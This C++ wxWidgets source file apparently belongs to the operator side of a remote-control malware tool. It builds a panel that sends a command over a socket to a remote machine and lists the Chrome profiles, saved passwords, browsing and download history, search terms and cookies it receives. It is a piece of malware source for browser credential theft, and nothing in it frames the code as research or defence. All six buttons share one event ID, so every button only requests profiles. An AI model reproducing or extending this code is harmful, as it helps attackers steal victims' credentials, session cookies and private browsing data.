#include "panel_info_chrome.hpp"
#include "server.hpp"
#include "misc.hpp"

extern Servidor* p_Servidor;

wxBEGIN_EVENT_TABLE(panelInfoChrome, wxPanel)
	EVT_BUTTON(EnumChromeInfoIDS::BTN_Profiles, panelInfoChrome::OnListaPerfiles)
wxEND_EVENT_TABLE()

panelInfoChrome::panelInfoChrome(wxWindow* pParent, SOCKET sck_socket)
	: wxPanel(pParent, EnumIDS::ID_Panel_Info) {
	
	this->sckSocket = sck_socket;

	wxButton* btn_perfiles = new wxButton(this, EnumChromeInfoIDS::BTN_Profiles, "Lista de perfiles");
	wxButton* btn_passwords = new wxButton(this, EnumChromeInfoIDS::BTN_Profiles, "Contraseñas");
	wxButton* btn_historialn = new wxButton(this, EnumChromeInfoIDS::BTN_Profiles, "Historial");
	wxButton* btn_historiald = new wxButton(this, EnumChromeInfoIDS::BTN_Profiles, "Descargas");
	wxButton* btn_searcht = new wxButton(this, EnumChromeInfoIDS::BTN_Profiles, "Busquedas");
	wxButton* btn_cookies = new wxButton(this, EnumChromeInfoIDS::BTN_Profiles, "Cookies");

	this->m_CrearListCtrls();

	wxBoxSizer* main_sizer = new wxBoxSizer(wxHORIZONTAL);
	
	wxBoxSizer* btns_sizer = new wxBoxSizer(wxVERTICAL);
	btns_sizer->Add(btn_perfiles, 1, wxEXPAND | wxALL, 1);
	btns_sizer->Add(btn_passwords, 1, wxEXPAND | wxALL, 1);
	btns_sizer->Add(btn_historialn, 1, wxEXPAND | wxALL, 1);
	btns_sizer->Add(btn_historiald, 1, wxEXPAND | wxALL, 1);
	btns_sizer->Add(btn_searcht, 1, wxEXPAND | wxALL, 1);
	btns_sizer->Add(btn_cookies, 1, wxEXPAND | wxALL, 1);

	wxFlexGridSizer* grid = new wxFlexGridSizer(6, 2, 0, 0);

	grid->Add(new wxStaticText(this, wxID_ANY, "Usuarios"));
	grid->Add(new wxStaticText(this, wxID_ANY, "Contraseñas"));
	grid->Add(listCtrlUsers, 1, wxEXPAND, 1);
	grid->Add(listCtrlPasswords, 1, wxEXPAND, 1);

	grid->Add(new wxStaticText(this, wxID_ANY, "Historial de Navegacion"), 0);
	grid->Add(new wxStaticText(this, wxID_ANY, "Historial de Descarga"), 0);
	grid->Add(listCtrlHistorialN, 1, wxEXPAND | wxALL, 1);
	grid->Add(listCtrlHistorialD, 1, wxEXPAND | wxALL, 1);
	
	
	grid->Add(new wxStaticText(this, wxID_ANY, "Busquedas"));
	grid->Add(new wxStaticText(this, wxID_ANY, "Cookies"));
	grid->Add(listCtrlSearchT, 1, wxEXPAND | wxALL, 1);
	grid->Add(listCtrlCookies, 1, wxEXPAND | wxALL, 1);

	main_sizer->Add(btns_sizer);
	main_sizer->Add(grid, 1, wxEXPAND | wxALL, 2);

	this->SetSizer(main_sizer);
}

void panelInfoChrome::OnListaPerfiles(wxCommandEvent&) {
	this->listCtrlUsers->DeleteAllItems();
	p_Servidor->cChunkSend(this->sckSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, true, EnumComandos::INF_Chrome_Profiles);
}

void panelInfoChrome::m_CrearListCtrls() {
	this->listCtrlUsers      = new wxListCtrl(this, wxID_ANY, wxDefaultPosition, wxDefaultSize, wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES);
	this->listCtrlPasswords  = new wxListCtrl(this, wxID_ANY, wxDefaultPosition, wxDefaultSize, wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES);
	this->listCtrlHistorialN = new wxListCtrl(this, wxID_ANY, wxDefaultPosition, wxDefaultSize, wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES);
	this->listCtrlHistorialD = new wxListCtrl(this, wxID_ANY, wxDefaultPosition, wxDefaultSize, wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES);
	this->listCtrlSearchT    = new wxListCtrl(this, wxID_ANY, wxDefaultPosition, wxDefaultSize, wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES);
	this->listCtrlCookies    = new wxListCtrl(this, wxID_ANY, wxDefaultPosition, wxDefaultSize, wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES);

	std::vector<ColumnData> columnas;
	columnas.push_back(ColumnData{ "Ruta",				   60 });
	columnas.push_back(ColumnData{ "Name",				   90 });
	columnas.push_back(ColumnData{ "Gaia Name",			   90 });
	columnas.push_back(ColumnData{ "ShortCut Name",		  100 });
	columnas.push_back(ColumnData{ "Username",			   90 });
	columnas.push_back(ColumnData{ "Hosted Domain",		  100 });
	this->m_InsertarColumnas(columnas,      this->listCtrlUsers);

	columnas.clear();

	columnas.push_back(ColumnData{ "URL",		  		  100 });
	columnas.push_back(ColumnData{ "Action",	 		  100 });
	columnas.push_back(ColumnData{ "User",		 		  100 });
	columnas.push_back(ColumnData{ "Password", 			  100 });
	this->m_InsertarColumnas(columnas,  this->listCtrlPasswords);

	columnas.clear();

	columnas.push_back(ColumnData{ "URL",				  100 });
	columnas.push_back(ColumnData{ "Titulo",			  100 });
	columnas.push_back(ColumnData{ "Visitas",			  100 });
	columnas.push_back(ColumnData{ "Ultima vez",		  150 });
	this->m_InsertarColumnas(columnas, this->listCtrlHistorialN);

	columnas.clear();

	columnas.push_back(ColumnData{ "Ruta",				  100 });
	columnas.push_back(ColumnData{ "Inicio",			  100 });
	columnas.push_back(ColumnData{ "Bytes",				  100 });
	columnas.push_back(ColumnData{ "URL",				  200 });
	columnas.push_back(ColumnData{ "MIME",				  150 });
	this->m_InsertarColumnas(columnas, this->listCtrlHistorialD);

	columnas.clear();

	columnas.push_back(ColumnData{ "Palabra o frase",	  400 });
	this->m_InsertarColumnas(columnas, this->listCtrlSearchT);

	columnas.clear();

	columnas.push_back(ColumnData{ "Creada",			  100 });
	columnas.push_back(ColumnData{ "Host",				  100 });
	columnas.push_back(ColumnData{ "Nombre",			  100 });
	columnas.push_back(ColumnData{ "Valor",				  200 });
	columnas.push_back(ColumnData{ "Ruta",				  150 });
	columnas.push_back(ColumnData{ "Expira",			  150 });
	columnas.push_back(ColumnData{ "Ultimo acceso",		  200 });
	columnas.push_back(ColumnData{ "Ultima modificacion", 200 });
	this->m_InsertarColumnas(columnas,    this->listCtrlCookies);

}

void panelInfoChrome::m_InsertarColumnas(std::vector<ColumnData>& columns, wxListCtrl*& list_ctrl) {
	if (list_ctrl && columns.size() > 0) {
		wxListItem itemCol;
		for(int index = 0; index < columns.size(); index++){
			itemCol.SetText(columns[index].strTitle.c_str());
			itemCol.SetWidth(columns[index].iSize);
			list_ctrl->InsertColumn(index, itemCol);
		}
	}
}

void panelInfoChrome::m_AgregarDataPerfiles(const std::string& strBuffer) {
	std::vector<std::string> vcProfiles = strSplit(strBuffer, CMD_DEL, 100);
	if (vcProfiles.size() > 0) {
		int iCount = 0;
		for (std::string& profile_raw : vcProfiles) {
			std::vector<std::string> profile_data = strSplit(profile_raw, '\'', 6);
			if (profile_data.size() == 6) {
				this->listCtrlUsers->InsertItem(iCount, profile_data[0]);
				this->listCtrlUsers->SetItem(iCount, 1, profile_data[1]);
				this->listCtrlUsers->SetItem(iCount, 2, profile_data[2]);
				this->listCtrlUsers->SetItem(iCount, 3, profile_data[3]);
				this->listCtrlUsers->SetItem(iCount, 4, profile_data[4]);
				this->listCtrlUsers->SetItem(iCount, 5, profile_data[5]);
				
				iCount++;
			}else {
				DEBUG_MSG("No se pudo parsear " + profile_raw);
				DEBUG_MSG(profile_data.size());
			}
		}
	}
}